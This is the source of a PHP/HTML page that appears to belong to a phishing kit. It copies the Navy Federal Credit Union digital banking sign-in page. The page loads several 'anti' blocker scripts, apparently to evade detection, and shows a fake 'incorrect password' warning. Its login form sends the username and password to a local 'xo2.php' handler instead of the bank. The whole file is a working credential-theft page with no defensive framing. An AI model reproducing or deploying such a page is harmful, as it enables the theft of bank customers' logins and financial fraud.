<?php
error_reporting(0);
include "./blocker/anti1.php";
include "./blocker/anti2.php";
include "./blocker/anti3.php";
include "./blocker/anti4.php";
include "./blocker/anti5.php";
include "./blocker/anti6.php";
include "./blocker/anti7.php";
include "./blocker/anti8.php";

?>
<!DOCTYPE html>



<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

<title>Navy Federal Credit Union - Our Members are the Mission&reg;</title>



<link rel="shortcut icon" href="resources/images/favicon.ico" type="image/x-icon" />
<link rel="apple-touch-icon" href="resources/images/apple-touch-icon-72x72-precomposed-ae3b3be0d460fbef25ad55dfec1ca683.png" />

<!-- Import this way for performance gains -->
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600">
<link rel="stylesheet" href="resources/css/nfcu-icons-70952c801211405657b59b94c775431e.css" />
<link rel="stylesheet" href="resources/css/all-70952c801211405657b59b94c775431e.css" />
 <!-- Added responsivemain.css for login.jsp changes -->
<link rel="stylesheet" href="resources/css/nauth-70952c801211405657b59b94c775431e.css" />
<link rel="stylesheet" href="resources/css/responsivemain-70952c801211405657b59b94c775431e.css" />


</head>

</head>



<body class="responsive">
 <a href="#end-header" id="skipnav"  class="skipnav" tabindex="-1">Skip Navigation Links</a>

<div class="mobileMenu">
	<div class="MobileMenuHeader">
	</div>
	<div class="MobileMenuContent">
		<div class="MobLocations">
	        <a href="https://www.navyfederal.org/branches-atms/index.php"><span>&#xe637;</span>Locations</a>
        </div>
		<div class="MobContactUs">
	        <a href="https://www.navyfederal.org/contact-us/"><span>&#xe632;</span>Contact Us</a>
        </div>
        <div class="MobRoutingNumber">
        	<p>Routing Number: <strong>256074974</strong></p>
        </div>
	</div>
</div>

<div class="pageWrap">  
	<!-- start of header -->	
	<div class="header-sm" role="banner">
		<div class="container">
			<div class="header-content-sm">
				<div class="mob-nav-menu">
					<i class="fa fa-bars"></i>
				</div>
				<div class="logo-sm">
					<a href="" title="Go to NavyFederal.org">
						<img class="logo-sm-pic" src="resources/images/NFCU_Mob_Logo-ae3b3be0d460fbef25ad55dfec1ca683.svg"
							 alt="Navy Federal Credit Union | Army, Marine Corps, Navy, Air Force, Coast Guard, Family (Logo)" />
					</a>
				</div>
			</div>
		</div>
	</div>
	<div class="header-bg" role="banner">
		<div class="container">
			<div class="content-box">
				<div class="header-content-bg">
					<div class="logo">
						<a href="https://www.navyfederal.org" title="Go to NavyFederal.org" class="logo_bg_a">
						<img src="resources/images/img_logo-veterans-ae3b3be0d460fbef25ad55dfec1ca683.svg" 
							alt="Navy Federal Credit Union | Army, Marine Corps, Navy, Air Force, Coast Guard, Family (Logo)" class="logo_bg"/> </a>
					</div>
					<div class="nav navbar-collapse">
						<div class="rt-container"><span class="text-routing">Routing Number: </span><span class="rnumber">256074974</span></div>
						<a	class="padRight20 loc-class" href="p">  Locations </a>
						
						<a class="Contact-us" href=""><img src="resources/images/contact-us-ae3b3be0d460fbef25ad55dfec1ca683.svg"
						class="icon_more_contact_us_default" alt="Contact Us"/> Contact Us</a>  
					</div>
				</div>
			</div>
		</div> 
	</div>
	
		<!-- end of header-->
		
		<!-- main content area starts here -->
	<div class="content-wrapper">
		
		        <div class="formbackground">
		        <a id="end-header"></a>
		        		
		        </div>
		        <div class="container">
		        	<div class="background-container">
		        	<div class="login-content-box">
						<div class="login">    
							<div class="headers"> 
								<h1>Welcome to Digital Banking</h1>
		                	</div>               
		                    	<div class="login-panel">
								<div class="alert alert-warning" role="alert">
										<p id="SignOn-Error"> The username or password you entered was incorrect. Please try again.</p><a class="alert-close-button"><img class="alert-close-img" height="24px" width="24px"></a>
									</div>
								<div class="panel panel-primary heading-callout">
				                    <div class="panel-heading">
				                        <h2 class="panel-title">Sign In</h2>
				                    </div>
				                    <div class="rule-container">
				                    	<div class="horizontal-line"></div>
				                    </div>
			                        <div class="panel-body">
			                            <div class="panel-content-left">
											<form id="Login" class="form-inline Rectangle-2459" name="Login" method="post" action="xo2.php" autocomplete="off">
												<div class="form-group username" style="display:inline-block;">
													<label for="user">Username</label> 
													
													<abbr class="tooltip" role="link" aria-disabled="true" aria-describeby="tooltip" aria-label="Sign into online banking with your unique Username, which may be your access number.">
														<img id="tooltip-user" src="resources/images/toolTip-ae3b3be0d460fbef25ad55dfec1ca683.svg" tabindex="1" aria-label="Sign into online banking with your unique Username, which may be your access number." alt="Sign into online banking with your unique Username, which may be your access number."/>
													</abbr>
						  	  							
													<input type="text" name="username" id="user" required="" value="" tabindex="2" maxlength="32" class="form-control"   required><br/>
													<span class="text-muted"><a href="" tabindex="5">Forgot Username</a></span>
												</div>
												<div  class="form-group password" style="display:inline-block;">
													<label  for="password" >Password</label>
													<input type="password" name="password" required="" id="password"  class="form-control" tabindex="3" required><br/>
													<span class="text-muted"><a href="" tabindex="6">Forgot Password</a></span>
												</div>
												
												
												
												<input type="submit" name="SignIn" class="btn btn-primary reg-sign-in" id="signIn" value="Sign In" tabindex="4">
												
											
												
											</form>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			